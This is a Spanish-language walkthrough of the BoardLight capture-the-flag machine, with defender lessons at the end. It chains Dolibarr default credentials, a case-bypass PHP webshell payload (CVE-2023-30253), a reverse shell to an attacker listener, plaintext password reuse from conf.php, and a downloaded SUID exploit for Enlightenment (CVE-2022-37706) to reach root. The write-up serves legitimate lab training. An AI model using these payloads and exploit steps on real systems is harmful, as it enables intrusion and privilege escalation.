Resumen Ejecutivo

BoardLight expone Apache 2.4.41 en el puerto 80 que sirve un VHost board.htb y un subdominio oculto crm.board.htb con Dolibarr 17.0.0. El acceso al panel se obtiene con credenciales por defecto admin:admin. Mediante CVE-2023-30253 se inyecta código PHP usando <?pHp (mayúsculas) para evadir el filtro y obtener una reverse shell como www-data. La contraseña serverfun2$2023!! almacenada en texto plano en conf.php es reutilizada para SSH como larissa. La escalada a root se logra explotando CVE-2022-37706 en el binario SUID enlightenment_sys, que no sanitiza rutas con /dev/.. al pasarlas a mount.

Reconocimiento — Paso a Paso

Paso 1 — Reconocimiento

Escaneo Nmap — Descubrimiento de puertos y servicios

¿Por qué este comando?

Nmap es el primer paso en cualquier pentesting. Con -sC ejecuta scripts básicos de enumeración y con -sV detecta versiones exactas de los servicios.

nmap -p22,80 -sC -sV -n 10.129.23.6 -oN phase2.txt
-p22,80 → escanear únicamente los puertos 22 y 80 (ya identificados en fase rápida)
-sC → scripts NSE por defecto
-sV → detección de versión del servicio
-oN → guardar el output en formato normal
Output

¿Qué nos dice este output?

Decisión tomada

Explorar el servicio web. Buscar hostname en el footer y realizar fuzzing de subdominios para encontrar aplicaciones ocultas.

Paso 2 — Reconocimiento

Descubrimiento de Virtual Host — Subdomain Fuzzing

¿Por qué este comando?

Al visitar http://10.129.23.6, el footer muestra el hostname board.htb. Apache puede servir aplicaciones diferentes según el header Host, así que un subdominio oculto puede albergar la aplicación vulnerable.

echo "10.129.23.6 board.htb crm.board.htb" | sudo tee -a /etc/hosts
ffuf -w bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
-w → wordlist de subdominios (SecLists bitquark)
-H 'Host: FUZZ.board.htb' → fuzzing del header Host (no de URL)
-fs 15949 → filtrar respuestas del tamaño de la página por defecto
Output
[Status: 200, Size: 6360, Words: 397, Lines: 150]
    * FUZZ: crm
¿Qué nos dice este output?
  • Subdominio encontrado: crm.board.htb
  • El filtro -fs elimina ruido y revela solo subdominios reales
Decisión tomada

Acceder a http://crm.board.htb para identificar la aplicación y buscar vulnerabilidades.

¿Por qué este intento?

Al acceder a crm.board.htb encontramos un panel de login de Dolibarr 17.0.0. Las credenciales por defecto admin:admin son el primer intento estándar en cualquier panel administrativo.

Decisión tomada

Buscar CVEs para Dolibarr 17.0.0. CVE-2023-30253 permite RCE autenticado mediante inyección PHP con bypass de filtro en mayúsculas.

Paso 4 — Explotación RCE

CVE-2023-30253 — PHP Code Injection vía módulo Websites

¿Por qué funciona?

Dolibarr ≤ 17.0.0 permite a usuarios autenticados inyectar PHP en páginas del módulo Websites. El filtro de seguridad bloquea <?php en minúsculas pero NO verifica variantes en mayúsculas. PHP acepta ambas formas, lo que permite el bypass.

Detalle técnico del bypass

Filtro: if (strpos($content, '<?php') !== false) { error(); }
Payload: <?pHp echo system($_GET["cmd"]); ?>
PHP interpreta ambas variantes igual. El filtro en minúsculas no captura <?pHp.

# Descargar exploit público
curl -s https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/main/exploit.py -o exploit.py
nc -lvnp 4444 &
python3 exploit.py http://crm.board.htb admin admin 10.10.14.154 4444
Output del exploit
[*] Trying authentication...
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell...

connect to [10.10.14.154] from (UNKNOWN) [10.129.23.6] 33430
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
¿Qué hace el exploit paso a paso?
  1. Crea un website en Dolibarr (acción addcontainer)
  2. Crea una página usando radiocreatefrom=checkboxcreatemanually con multipart/form-data
  3. Inyecta el payload de reverse shell con <?pHp mediante updatesource
  4. Trigger: /public/website/index.php?website=X&pageref=X
  5. Shell recibida como www-data
Decisión tomada

Buscar credenciales en el archivo de configuración conf/conf.php de Dolibarr.

Paso 5 — Post-explotación

Extracción de credenciales — conf.php

¿Por qué leer conf.php?

Dolibarr guarda la contraseña de la base de datos en texto plano en htdocs/conf/conf.php. Los administradores frecuentemente reutilizan la misma contraseña entre la BD y las cuentas del sistema operativo.

www-data@boardlight$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
Credenciales encontradas
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_name='dolibarr';
¿Qué nos dice este output?
  • Contraseña MySQL: serverfun2$2023!!
  • Usuario del sistema en /etc/passwd: larissa (uid=1000)
  • Hipótesis: el admin reutilizó la contraseña entre MySQL y SSH
Decisión tomada

Intentar SSH con larissa:serverfun2$2023!!.

Escalada de Privilegios — CVE-2022-37706

Paso 7 — Enumeración SUID

Búsqueda de binarios SUID — Enlightenment

¿Por qué SUID?

Los binarios SUID se ejecutan con los privilegios del propietario, no del usuario que los ejecuta. Si el propietario es root y el binario es vulnerable, puede usarse para escalar privilegios. Es uno de los primeros vectores a revisar en Linux.

larissa@boardlight$ enlightenment --version
larissa@boardlight$ find /usr/lib/x86_64-linux-gnu/enlightenment -perm -4000 2>/dev/null
Binarios SUID encontrados
Version: 0.23.1

-rwsr-xr-x root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
-rwsr-xr-x root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-rwsr-xr-x root root  /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
¿Qué nos dice este output?
  • enlightenment_sys v0.23.1 con bit SUID y propiedad root
  • CVE-2022-37706 afecta a Enlightenment < 0.25.4 → vulnerable
  • La función mount mal maneja rutas con /dev/.. → ejecución arbitraria
Decisión tomada

Descargar y ejecutar el exploit público de CVE-2022-37706.

Paso 8 — Root

CVE-2022-37706 — Path Traversal en enlightenment_sys → Root

¿Cómo funciona la vulnerabilidad?

enlightenment_sys llama a /bin/mount con argumentos controlables por el usuario. El binario no sanitiza correctamente rutas con /dev/../tmp/;/tmp/exploit. El shell interpreta el ; como separador de comandos, ejecutando /tmp/exploit con privilegios de root.

# Desde Kali: servir exploit
curl -s https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh -o exploit.sh
python3 -m http.server 8888
# En la máquina como larissa
larissa@boardlight:/tmp$ wget http://10.10.14.154:8888/exploit.sh && chmod +x exploit.sh
larissa@boardlight:/tmp$ bash exploit.sh
Output — Root Shell
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
mount: /dev/../tmp/: can't find in /etc/fstab.

uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
f6dde27173550dca8eb9e40e154e4894
¿Qué nos dice este output?

El exploit ejecuta: enlightenment_sys /bin/mount -o noexec,nosuid,...,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net. El directorio /dev/../tmp/;/tmp/exploit hace que el shell ejecute primero /tmp/exploit (que contiene /bin/sh) con privilegios SUID de root.

Lecciones Aprendidas

⚔ Para el Atacante

  • Si encuentras Dolibarr, verifica versión: ≤17.0.0 = RCE asegurado
  • El payload <?pHp requiere multipart/form-data, no urlencoded
  • Trigger URL: /public/website/index.php?website=X&pageref=X
  • Tras RCE, leer siempre conf.php, config.yml, .env
  • Password reuse BD↔SSH es extremadamente común en máquinas Easy/Medium
  • Enlightenment SUID = vector poco conocido pero directo a root

🛡 Para el Defensor

  • Actualizar Dolibarr a ≥ 17.0.1 y deshabilitar el módulo Websites si no se usa
  • Nunca usar admin:admin en producción
  • Usar variables de entorno o secrets manager, no contraseñas en conf.php
  • Contraseñas únicas por servicio (sin reuse BD ↔ SSH)
  • chmod u-s en binarios de enlightenment si no se usa el desktop
  • Actualizar Enlightenment a ≥ 0.25.4
